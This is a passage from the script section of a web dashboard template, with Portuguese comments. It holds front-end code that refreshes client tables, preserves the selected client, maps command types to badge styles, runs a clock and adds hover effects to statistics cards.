                if (typeof fetchDashboardClients === 'function') {
                    fetchDashboardClients();
                }
                
                // Note: Stats are now auto-updated via HTMX every 10 seconds
                // fetchClientStats() call removed to avoid conflicts with HTMX auto-refresh
                
                // Atualiza também os logs que podem conter informações dos clientes
                // Somente se a função refreshLogs existir e se estivermos na página de logs
                if (typeof refreshLogs === 'function' && document.getElementById('logs-page') && 
                    document.getElementById('logs-page').classList.contains('active')) {
                    refreshLogs();
                }
                
                // Preserva a seleção do cliente atual após a atualização
                const targetClientEl = document.getElementById('target-client');
                if (targetClientEl && targetClientEl.value && targetClientEl.value !== 'default') {
                    const selectedClientId = targetClientEl.value;
                    
                    // Pequeno delay para garantir que as tabelas foram atualizadas
                    setTimeout(() => {
                        try {
                            // Seleciona novamente o cliente para preservar o estado
                            document.querySelectorAll(`tr[data-client-id="${selectedClientId}"]`).forEach(row => {
                                row.classList.add('client-selected');
                            });
                        } catch (err) {
                            console.warn("Não foi possível preservar a seleção de cliente:", err);
                        }
                    }, 500);
                }
                
                // Mostra feedback visual para o usuário
                if (typeof showNeonToast === 'function') {
                    setTimeout(() => {
                        showNeonToast("Tabelas de clientes atualizadas", "success", 2000);
                    }, 1000);
                }
            } catch (err) {
                console.error("Erro ao atualizar tabelas de clientes:", err);
                
                // Tenta mostrar feedback de erro
                if (typeof showNeonToast === 'function') {
                    showNeonToast("Erro ao atualizar clientes: " + err.message, "error", 3000);
                }
            }
        }

        // Funções para compatibilidade com o console-terminal.js

        function getCommandTypeBadge(type) {
            switch(type) {
                case 'js': return 'badge-bg-danger';
                case 'html': return 'badge-bg-primary';
                case 'manipulate': return 'badge-bg-success';
                case 'visibility': return 'badge-bg-warning';
                case 'head': return 'badge-bg-info';
                default: return 'badge-bg-secondary';
            }
        }
        
        // Atualizar o relógio
        function updateClock() {
            const now = new Date();
            const timeString = now.toLocaleTimeString();
            const clockElement = document.getElementById('current-time');
            
            if (clockElement) {
                clockElement.textContent = timeString;
                
                // Efeito de pulso a cada segundo
                clockElement.classList.add('pulse');
                setTimeout(() => {
                    clockElement.classList.remove('pulse');
                }, 500);
            }
        }
        
        // Inicializar o relógio e atualizá-lo a cada segundo
        setInterval(updateClock, 1000);
        updateClock(); // Executar imediatamente
        
        // Função de inicialização ao carregar a página
        document.addEventListener('DOMContentLoaded', function() {
            // Atualizar dados iniciais
            refreshDashboard();
            
            // Configurar atualização periódica dos gráficos (a cada 30 segundos)
            setInterval(function() {
                // Só atualizar se estivermos na aba dashboard
                const dashboardPage = document.getElementById('dashboard-page');
                if (dashboardPage && dashboardPage.classList.contains('active')) {
                    fetchClientStats();
                }
            }, 30000);
            
            // Adicionar efeitos de hover aos cards de estatísticas
            const statsCards = document.querySelectorAll('.stats-card');
            if (statsCards) {
                statsCards.forEach(card => {
                    card.addEventListener('mouseover', function() {
                        const icon = this.querySelector('.stats-icon');
                        if (icon) {
                            icon.classList.add('pulse-animation');
                        }
                    });
                    
                    card.addEventListener('mouseout', function() {
                        const icon = this.querySelector('.stats-icon');
                        if (icon) {
                            icon.classList.remove('pulse-animation');
                        }
                    });
                });
            }
        });
    </script>
{% endblock %}
